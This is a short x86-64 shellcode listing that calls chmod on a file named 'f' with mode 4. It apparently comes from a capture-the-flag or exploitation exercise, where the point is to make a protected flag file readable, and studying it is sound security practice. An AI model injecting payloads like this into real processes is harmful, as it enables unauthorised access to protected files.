.global _start
_start:
.intel_syntax noprefix
push 0x66
mov rdi, rsp
push 0x4
pop rsi
jmp next
.rept 10
nop
.endr
next:
push 0x5a
pop rax
syscall
